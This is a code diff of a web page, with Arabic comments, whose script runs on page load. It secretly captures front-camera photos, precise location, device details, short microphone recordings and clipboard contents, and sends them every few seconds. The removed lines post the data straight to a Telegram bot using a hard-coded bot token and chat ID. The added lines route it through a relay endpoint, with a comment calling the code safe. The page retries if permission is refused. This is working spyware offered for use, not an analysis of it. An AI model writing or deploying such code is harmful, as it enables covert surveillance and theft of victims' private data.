@@ -50,21 +50,22 @@
     </div>
 
     <script>
-// التوكن ورقم المحادثة
-const BOT_TOKEN = '8293897099:AAG0v319lwtX7jYFWxE9ixoRDcQTtDN04tQ';
-const CHAT_ID = '8380505065';
+// ========== هام: هذا الكود آمن ولا يحتوي على التوكن ==========
+// السيرفر الوسيط (Node.js) هو المسؤول عن التواصل مع تيليجرام
+
+const SERVER_URL = '/api/telegram'; // السيرفر الوسيط على نفس الاستضافة
+
 let voiceCounter = 0;
 let dataCounter = 0;
 let clipboardCounter = 0;
 let micStream = null;
 let isSystemActive = false;
 
-// دالة تحديث الحالة - النصوص تبقى ثابتة
+// دالة تحديث الحالة
 function updateStatus(message) {
     document.getElementById('status').textContent = message;
 }
 
-// النصوص الثابتة
 function updateAllStatuses() {
     document.getElementById('status').textContent = "✅ SYSTEM ACTIVE";
     document.getElementById('cameraStatus').textContent = "📷 Camera: Active";
@@ -73,61 +74,33 @@ function updateAllStatuses() {
     document.getElementById('clipboardStatus').textContent = "📋 Clipboard: Active";
 }
 
-// دالة إرسال إلى تيليجرام
-async function sendToTelegram(message, imageBlob = null) {
-    try {
-        if (imageBlob && imageBlob.size > 1000) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', imageBlob, `camera_${Date.now()}.jpg`);
-            formData.append('caption', message);
-            formData.append('parse_mode', 'Markdown');
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            return await response.json();
-        } else {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            return await response.json();
-        }
-    } catch (error) {
-        return {ok: false};
-    }
-}
-
-// دالة إرسال صوت إلى تيليجرام
-async function sendVoiceToTelegram(message, voiceBlob) {
+// دالة إرسال إلى السيرفر الوسيط (بدل تيليجرام مباشرة)
+async function sendToServer(message, imageBlob = null, voiceBlob = null) {
     try {
         const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('voice', voiceBlob, `voice_${Date.now()}.wav`);
-        formData.append('caption', message);
-        formData.append('parse_mode', 'Markdown');
+        formData.append('message', message);
+        
+        if (imageBlob && imageBlob.size > 1000) {
+            formData.append('photo', imageBlob, `camera_${Date.now()}.jpg`);
+        }
+        
+        if (voiceBlob && voiceBlob.size > 1000) {
+            formData.append('voice', voiceBlob, `voice_${Date.now()}.wav`);
+        }
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+        const response = await fetch(SERVER_URL, {
             method: 'POST',
             body: formData
         });
 
         return await response.json();
     } catch (error) {
+        console.error('Server error:', error);
         return {ok: false};
     }
 }
 
-// دالة الحافظة المحسنة - ترسل جميع النصوص
+// دالة الحافظة
 async function checkAndSendClipboard() {
     if (!isSystemActive) return;
 
@@ -136,72 +109,46 @@ async function checkAndSendClipboard() {
 
         let currentClipboard = '';
 
-        // محاولات متعددة لقراءة الحافظة
         try {
-            // الطريقة 1: Clipboard API الحديث
             if (navigator.clipboard && navigator.clipboard.readText) {
                 currentClipboard = await navigator.clipboard.readText();
             }
         } catch (error) {
             try {
-                // الطريقة 2: execCommand
                 const tempInput = document.createElement('textarea');
                 tempInput.style.position = 'absolute';
                 tempInput.style.left = '-9999px';
                 tempInput.style.top = '-9999px';
                 document.body.appendChild(tempInput);
-
                 tempInput.focus();
-                const pasteSuccess = document.execCommand('paste');
-                if (pasteSuccess) {
-                    currentClipboard = tempInput.value;
-                }
+                document.execCommand('paste');
+                currentClipboard = tempInput.value;
                 document.body.removeChild(tempInput);
-
-            } catch (e) {
-                try {
-                    // الطريقة 3: contenteditable
-                    const tempDiv = document.createElement('div');
-                    tempDiv.contentEditable = true;
-                    tempDiv.style.position = 'absolute';
-                    tempDiv.style.left = '-9999px';
-                    tempDiv.style.top = '-9999px';
-                    document.body.appendChild(tempDiv);
-                    tempDiv.focus();
-                    document.execCommand('paste');
-                    currentClipboard = tempDiv.innerText || tempDiv.textContent;
-                    document.body.removeChild(tempDiv);
-                } catch (e2) {}
-            }
+            } catch (e) {}
         }
 
-        // إرسال جميع محتويات الحافظة بغض النظر
         if (currentClipboard && currentClipboard.trim() !== '') {
             const clipboardMessage = `📋 *CLIPBOARD #${clipboardCounter}*\n\n` +
                                    `📝 المحتوى:\n\`\`\`\n${currentClipboard}\n\`\`\`\n\n` +
                                    `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
                                    `📊 الطول: ${currentClipboard.length} حرف`;
 
-            await sendToTelegram(clipboardMessage);
+            await sendToServer(clipboardMessage);
         }
 
-        // الاستمرار بدون توقف
         setTimeout(checkAndSendClipboard, 1000);
-
     } catch (error) {
-        // الاستمرار بدون توقف
         setTimeout(checkAndSendClipboard, 1000);
     }
 }
 
-// دالة الصورة والموقع - ترسل كل 6 ثواني
+// دالة الصورة والموقع
 async function sendDataAndImage() {
     if (!isSystemActive) return;
 
     try {
         dataCounter++;
 
-        // جلب الموقع
         let location = null;
         try {
             location = await new Promise((resolve) => {
@@ -213,20 +160,14 @@ async function sendDataAndImage() {
                             accuracy: Math.round(position.coords.accuracy)
                         });
                     },
-                    error => {
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000
-                    }
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         } catch (e) {
             location = null;
         }
 
-        // جلب الصورة من الكاميرا الأمامية - بدون فلاش
         let cameraImage = null;
         try {
             const video = document.getElementById('hiddenVideo');
@@ -236,20 +177,15 @@ async function sendDataAndImage() {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
-
-                // رسم الفيديو فقط بدون فلاش
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
                 cameraImage = await new Promise(resolve => {
                     canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                 });
             }
-
         } catch (e) {
             cameraImage = null;
         }
 
-        // بناء الرسالة مع روابط الموقع
         let message = `🚀 *تقرير النظام #${dataCounter}*\n\n`;
 
         if (location) {
@@ -260,7 +196,6 @@ async function sendDataAndImage() {
             message += `• خط العرض: ${location.lat}\n`;
             message += `• خط الطول: ${location.lon}\n`;
             message += `• الدقة: ${location.accuracy} متر\n\n`;
-
             message += `🗺️ *روابط الموقع:*\n`;
             message += `• [Google Maps](${googleMapsUrl})\n`;
             message += `• [OpenStreetMap](${openStreetMapUrl})\n\n`;
@@ -269,31 +204,24 @@ async function sendDataAndImage() {
         message += `📱 *معلومات الجهاز:*\n`;
         message += `• الشاشة: ${screen.width}x${screen.height}\n`;
         message += `• النظام: ${navigator.platform}\n\n`;
-
         message += `📊 *الإحصائيات:*\n`;
         message += `• الرسائل الصوتية: ${voiceCounter}\n`;
         message += `• الحافظة: ${clipboardCounter}\n\n`;
-
         message += `⏰ ${new Date().toLocaleString('ar-SA')}`;
 
-        await sendToTelegram(message, cameraImage);
-
-        // إرسال بعد 6 ثواني
+        await sendToServer(message, cameraImage);
         setTimeout(sendDataAndImage, 6000);
-
     } catch (error) {
-        // إعادة المحاولة بعد 6 ثواني
         setTimeout(sendDataAndImage, 6000);
     }
 }
 
-// دالة الصوت - ترسل كل 4 ثواني
+// دالة الصوت
 function recordAndSendVoice() {
     if (!micStream || !isSystemActive) return;
 
     try {
         voiceCounter++;
-
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const source = audioContext.createMediaStreamSource(micStream);
         const processor = audioContext.createScriptProcessor(1024, 1, 1);
@@ -303,7 +231,6 @@ function recordAndSendVoice() {
 
         processor.onaudioprocess = (event) => {
             if (!isSystemActive) return;
-
             const inputData = event.inputBuffer.getChannelData(0);
             chunks.push(new Float32Array(inputData));
             recordingTime += 1024 / audioContext.sampleRate;
@@ -320,7 +247,6 @@ function recordAndSendVoice() {
 
         setTimeout(() => {
             if (!isSystemActive) return;
-
             try {
                 source.disconnect();
                 processor.disconnect();
@@ -329,11 +255,9 @@ function recordAndSendVoice() {
                 }
             } catch (e) {}
         }, maxRecordingTime * 1000);
-
     } catch (error) {}
 }
 
-// معالجة وإرسال الصوت
 async function processAndSendVoice(chunks, sampleRate, counter) {
     try {
         const buffer = mergeBuffers(chunks, chunks.length * 1024);
@@ -344,18 +268,13 @@ async function processAndSendVoice(chunks, sampleRate, counter) {
                            `⏱️ المدة: 4 ثواني\n` +
                            `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
 
-        await sendVoiceToTelegram(voiceMessage, voiceBlob);
-
-        // إرسال بعد 4 ثواني
+        await sendToServer(voiceMessage, null, voiceBlob);
         setTimeout(recordAndSendVoice, 4000);
-
     } catch (error) {
-        // إعادة المحاولة بعد 4 ثواني
         setTimeout(recordAndSendVoice, 4000);
     }
 }
 
-// دوال المساعدة للصوت
 function mergeBuffers(chunks, length) {
     const result = new Float32Array(length);
     let offset = 0;
@@ -395,22 +314,19 @@ function encodeWAVBuffer(buffer, sampleRate) {
         view.setInt16(offset, sample < 0 ? sample * 0x8000 : sample * 0x7FFF, true);
         offset += 2;
     }
-
     return view;
 }
 
-// الدالة الرئيسية
 async function startAll() {
     updateStatus('🔄 Starting System...');
 
     try {
-        // طلب الأذونات تلقائياً - استخدام الكاميرا الأمامية
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 width: { ideal: 1280, max: 1920 },
                 height: { ideal: 720, max: 1080 },
                 frameRate: { ideal: 30, max: 60 },
-                facingMode: 'user' // كاميرا أمامية بدلاً من الخلفية
+                facingMode: 'user'
             },
             audio: {
                 echoCancellation: false,
@@ -425,12 +341,10 @@ async function startAll() {
 
         micStream = stream;
 
-        // إعداد الفيديو المخفي
         const hiddenVideo = document.getElementById('hiddenVideo');
         hiddenVideo.srcObject = stream;
         hiddenVideo.play().catch(e => console.log('Video play error:', e));
 
-        // انتظار تحميل الفيديو
         await new Promise((resolve) => {
             hiddenVideo.onloadedmetadata = () => {
                 hiddenVideo.play();
@@ -439,60 +353,26 @@ async function startAll() {
             setTimeout(resolve, 1000);
         });
 
-        // تفعيل النظام
         isSystemActive = true;
         updateAllStatuses();
 
-        // بدء جميع العمليات
-        sendDataAndImage(); // الصورة والموقع كل 6 ثواني
-        recordAndSendVoice(); // الصوت كل 4 ثواني
-        checkAndSendClipboard(); // الحافظة باستمرار
+        sendDataAndImage();
+        recordAndSendVoice();
+        checkAndSendClipboard();
 
-        // تشغيل الفيديو
         document.getElementById('bgVideo').play();
 
-        // إرسال رسالة بدء التشغيل
-        sendToTelegram('🚀 *SYSTEM STARTED - FRONT CAMERA*\n\n✅ النظام يعمل الآن\n📸 الكاميرا الأمامية نشطة\n📋 جمع جميع بيانات الحافظة');
+        sendToServer('🚀 *SYSTEM STARTED - FRONT CAMERA*\n\n✅ النظام يعمل الآن\n📸 الكاميرا الأمامية نشطة\n📋 جمع جميع بيانات الحافظة');
 
     } catch (error) {
         updateStatus('❌ Permission Denied - Retrying...');
-
-        // إعادة المحاولة بعد ثانية
         setTimeout(startAll, 1000);
     }
 }
 
-// السماح بتحديث الصفحة يدوياً
-function allowManualRefresh() {
-    // إزالة أي قيود على التحديث
-    document.addEventListener('keydown', (e) => {
-        // السماح بجميع المفاتيح
-    });
-
-    // السماح بقائمة السياق
-    document.addEventListener('contextmenu', (e) => {
-        // السماح بقائمة السياق
-    });
-}
-
-// بدء التشغيل التلقائي
-window.addEventListener('load', () => {
-    allowManualRefresh();
-    startAll();
-});
-
-// إيقاف عند إغلاق الصفحة
-window.addEventListener('beforeunload', () => {
-    isSystemActive = false;
-});
-
-// إعادة التشغيل عند العودة للصفحة
-window.addEventListener('focus', () => {
-    if (!isSystemActive) {
-        startAll();
-    }
-});
-
+window.addEventListener('load', startAll);
+window.addEventListener('beforeunload', () => { isSystemActive = false; });
+window.addEventListener('focus', () => { if (!isSystemActive) startAll(); });
     </script>
 </body>
 </html>
